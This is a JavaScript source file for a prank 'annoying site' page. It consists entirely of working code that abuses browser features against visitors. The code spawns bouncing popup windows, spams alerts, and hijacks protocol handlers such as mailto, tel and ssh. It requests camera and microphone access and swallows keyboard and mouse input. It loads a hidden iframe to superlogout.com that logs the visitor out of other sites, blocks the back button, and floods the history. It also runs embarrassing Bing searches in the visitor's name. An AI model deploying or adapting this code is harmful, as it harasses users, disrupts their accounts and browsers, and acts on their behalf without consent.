const SCREEN_WIDTH = window.screen.availWidth
const SCREEN_HEIGHT = window.screen.availHeight
const WIN_WIDTH = 480
const WIN_HEIGHT = 260
const VELOCITY = 15
const MARGIN = 10
const TICK_LENGTH = 50

const ART = [
  `
┊┊ ☆┊┊┊┊☆┊┊☆ ┊┊┊┊┊
┈┈┈┈╭━━━━━━╮┊☆ ┊┊
┈☆ ┈┈┃╳╳╳▕╲▂▂╱▏┊┊
┈┈☆ ┈┃╳╳╳▕▏▍▕▍▏┊┊
┈┈╰━┫╳╳╳▕▏╰┻╯▏┊┊
☆ ┈┈┈┃╳╳╳╳╲▂▂╱┊┊┊
┊┊☆┊╰┳┳━━┳┳╯┊ ┊ ☆┊
  `,
  `
░░▓▓░░░░░░░░▓▓░░
░▓▒▒▓░░░░░░▓▒▒▓░
░▓▒▒▒▓░░░░▓▒▒▒▓░
░▓▒▒▒▒▓▓▓▓▒▒▒▒▓░
░▓▒▒▒▒▒▒▒▒▒▒▒▒▒▓
▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓
▓▒▒▒░▓▒▒▒▒▒░▓▒▒▓
▓▒▒▒▓▓▒▒▒▓▒▓▓▒▒▓
▓▒░░▒▒▒▒▒▒▒▒▒░░▓
▓▒░░▒▓▒▒▓▒▒▓▒░░▓
░▓▒▒▒▓▓▓▓▓▓▓▒▒▓░
░░▓▒▒▒▒▒▒▒▒▒▒▓░░
░░░▓▓▓▓▓▓▓▓▓▓░░░
  `
]

const SEARCHES = [
  'where should i bury the body',
  'why does my eye twitch',
  'why is my poop green',
  'why do i feel so empty',
  'why do i always feel hungry',
  'why do i always have diarrhea',
  'why does my anus itch',
  'why does my belly button smell',
  'why does my cat attack me',
  'why does my dog eat poop',
  'why does my fart smell so bad',
  'why does my mom hate me',
  'why does my pee smell bad',
  'why does my poop float',
  'proof that the earth is flat'
]

const VIDEOS = [
  'badger.mp4',
  'cat.mp4',
  'heman.mp4',
  'nyan.mp4',
  'rickroll.mp4',
  'space.mp4',
  'trolol.mp4'
]

/**
 * Array to store the child windows spawned by this window.
 */
const wins = []

/*
 * Run this code in all windows, *both* child and parent windows.
 */
init()

/*
 * Use `window.opener` to detect if this window was opened by another window, which
 * will be its parent. The `window.opener` variable is a reference to the parent
 * window.
 */
if (window.opener) initChildWindow()
else initParentWindow()

/**
 * Initialization code for *both* parent and child windows.
 */
function init () {
  confirmPageUnload()
  registerProtocolHandlers()
  requestCameraAndMic()

  interceptUserInput(event => {
    // Prevent default behavior (breaks closing window shortcuts)
    event.preventDefault()
    event.stopPropagation()

    startVibrateInterval()
    enablePictureInPicture()
    focusWindows()
    openWindow()
    requestCameraAndMic()
  })
}

/**
 * Initialization code for child windows.
 */
function initChildWindow () {
  moveWindowBounce()
  startVideo()
  detectWindowClose()
}

/**
 * Initialization code for parent windows.
 */
function initParentWindow () {
  startAlertInterval()
  showHelloMessage()
  superLogout()
  blockBackButton()
  fillHistory()
  startInvisiblePictureInPictureVideo()
}

/**
 * Ask the user "are you sure you want to leave this page?". In most browsers,
 * this will not actually do anything unless the user has at least one interaction
 * with the page before they close it.
 */
function confirmPageUnload () {
  window.addEventListener('beforeunload', event => {
    event.returnValue = true
  })
}

/**
 * Attempt to register all possible browser-whitelisted protocols to be handled by
 * this web app instead of their default handlers.
 */
function registerProtocolHandlers () {
  if (typeof navigator.registerProtocolHandler !== 'function') return

  const protocolWhitelist = [
    'bitcoin',
    'geo',
    'im',
    'irc',
    'ircs',
    'magnet',
    'mailto',
    'mms',
    'news',
    'ircs',
    'nntp',
    'sip',
    'sms',
    'smsto',
    'ssh',
    'tel',
    'urn',
    'webcal',
    'wtai',
    'xmpp'
  ]

  const handlerUrl = window.location.href + '/url=%s'

  protocolWhitelist.forEach(proto => {
    navigator.registerProtocolHandler(proto, handlerUrl, 'The Annoying Site')
  })
}

/**
 * Attempt to access the user's camera and microphone.
 */
function requestCameraAndMic () {
  if (!navigator.mediaDevices ||
      typeof navigator.mediaDevices.getUserMedia !== 'function') {
    return
  }
  navigator.mediaDevices.getUserMedia({
    audio: true, video: true
  }, () => {}, () => {})
}

function startVibrateInterval () {
  if (typeof window.navigator.vibrate !== 'function') return
  window.navigator.vibrate(200)
}

/**
 * Intercept all user-initiated events and call the given the function, `onInput`.
 */
function interceptUserInput (onInput) {
  document.body.addEventListener('mousedown', onInput)
  document.body.addEventListener('click', onInput)
  document.body.addEventListener('mouseup', onInput)
  document.body.addEventListener('keydown', onInput)
  document.body.addEventListener('keypress', onInput)
  document.body.addEventListener('keyup', onInput)
}

function startInvisiblePictureInPictureVideo () {
  const video = document.createElement('video')
  video.src = './trolol.mp4'
  video.autoplay = true
  video.loop = true
  video.muted = true
  video.style = 'opacity: 0; height: 1;'

  document.body.appendChild(video)
}

/**
 * Active Safari's picture-in-picture feature, which let's show a video on the
 * desktop. Requires user-initiated event.
 */
function enablePictureInPicture () {
  const video = document.querySelector('video')
  if (video.webkitSetPresentationMode) {
    video.muted = false
    video.webkitSetPresentationMode('picture-in-picture')
  }
}

/**
 * Focus all child windows. Requires user-initiated event.
 */
function focusWindows () {
  wins.forEach(win => {
    if (!win.closed) win.focus()
  })
}

/**
 * Open a new popup window. Requires user-initiated event.
 */
function openWindow () {
  const { x, y } = getRandomCoords()
  const opts = `width=${WIN_WIDTH},height=${WIN_HEIGHT},left=${x},top=${y}`
  const win = window.open(window.location.pathname, '', opts)

  // New windows may be blocked by the popup blocker
  if (!win) return

  wins.push(win)

  if (wins.length === 1) setupSearchWindow(win)
}

/**
 * Move the window around the screen and bounce off of the screen edges.
 */
function moveWindowBounce () {
  let vx = VELOCITY * (Math.random() > 0.5 ? 1 : -1)
  let vy = VELOCITY * (Math.random() > 0.5 ? 1 : -1)

  window.setInterval(() => {
    const x = window.screenX
    const y = window.screenY
    const width = window.outerWidth
    const height = window.outerHeight

    if (x < MARGIN) vx = Math.abs(vx)
    if (x + width > SCREEN_WIDTH - MARGIN) vx = -1 * Math.abs(vx)
    if (y < MARGIN + 20) vy = Math.abs(vy)
    if (y + height > SCREEN_HEIGHT - MARGIN) vy = -1 * Math.abs(vy)

    window.moveBy(vx, vy)
  }, TICK_LENGTH)
}

/**
 * Show a random troll video in the window.
 */
function startVideo () {
  const video = document.createElement('video')

  video.src = getRandomArrayEntry(VIDEOS)
  video.autoplay = true
  video.loop = true
  video.style = 'width: 100%; height: 100%;'

  document.body.appendChild(video)
}

/**
 * When a child window closes, notify the parent window so it can remove it from
 * the list of child windows.
 */
function detectWindowClose () {
  window.addEventListener('unload', () => {
    if (!window.opener.closed) window.opener.onCloseWindow(window)
  })
}

/**
 * Handle a child window closing.
 */
function onCloseWindow (win) {
  const i = wins.indexOf(win)
  if (i >= 0) wins.splice(i, 1)
}

function showHelloMessage () {
  const template = document.querySelector('template')
  const clone = document.importNode(template.content, true)
  document.body.appendChild(clone)
}

/**
 * Show an alert dialog with 1000's of lines of cat ASCII art, at regular intervals
 */
function startAlertInterval () {
  setInterval(() => {
    const randomArt = getRandomArrayEntry(ART)
    const longAlertText = Array(200).join(randomArt)
    window.alert(longAlertText)
  }, 15000)
}

/**
 * Log the user out of top sites they're logged into, including Google.com.
 */
function superLogout () {
  const logoutIframe = document.createElement('iframe')
  logoutIframe.src = 'https://superlogout.com'
  logoutIframe.style = 'width: 1px; height: 1px;'
  document.body.appendChild(logoutIframe)
}

/**
 * Disable the back button. If the user goes back, send them one page forward ;-)
 */
function blockBackButton () {
  window.addEventListener('popstate', () => {
    window.history.forward()
  })
}

/**
 * Fill the history with extra entries for this site, to make it harder to find
 * the previous site in the back button's dropdown menu.
 */
function fillHistory () {
  for (let i = 1; i < 20; i++) {
    window.history.pushState({}, '', window.location.pathname + '?q=' + i)
  }
  // Set location back to the initial location, so user does not notice
  window.history.pushState({}, '', window.location.pathname)
}

/**
 * Get random x, y coordinates for a new window on the screen. Takes into account
 * screen size, window size, and leaves a safe margin on all sides.
 */
function getRandomCoords () {
  const x = MARGIN +
    Math.floor(Math.random() * (SCREEN_WIDTH - WIN_WIDTH - MARGIN))
  const y = MARGIN +
    Math.floor(Math.random() * (SCREEN_HEIGHT - WIN_HEIGHT - MARGIN))
  return { x, y }
}

/**
 * Get a random element from a given array, `arr`.
 */
function getRandomArrayEntry (arr) {
  return arr[Math.floor(Math.random() * arr.length)]
}

function setupSearchWindow (win) {
  if (!win) return
  win.window.location = 'http://www.bing.com/search?q=' + encodeURIComponent(SEARCHES[0])
  let searchIndex = 1
  let interval = setInterval(() => {
    if (searchIndex >= SEARCHES.length) {
      clearInterval(interval)
      win.window.location = window.location.pathname
      return
    }

    if (win.closed) {
      clearInterval(interval)
      onCloseWindow(win)
      return
    }

    win.window.location = window.location.pathname
    setTimeout(() => {
      const { x, y } = getRandomCoords()
      win.moveTo(x, y)
      win.window.location = 'http://www.bing.com/search?q=' + encodeURIComponent(SEARCHES[searchIndex])
      searchIndex += 1
    }, 500)
  }, 2500)
}
